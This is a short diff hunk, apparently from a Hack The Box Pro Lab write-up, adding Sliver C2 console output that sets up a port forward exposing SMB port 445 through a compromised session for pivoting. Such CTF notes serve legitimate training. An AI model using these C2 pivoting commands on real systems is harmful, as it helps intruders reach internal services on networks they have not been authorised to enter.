@@ -445,3 +445,11 @@ sliver (BLUSHING_ERROR) > upload /home/joel/hacking/ctf/htb/pro-lab/puppet/scrip
 sliver (BLUSHING_ERROR) >
 
 ```
+
+```
+sliver (BLUSHING_ERROR) > portfwd add --bind 0.0.0.0:445 --remote 127.0.0.1:445
+
+[*] Port forwarding 0.0.0.0:445 -> 127.0.0.1:445
+
+sliver (BLUSHING_ERROR) >
+```
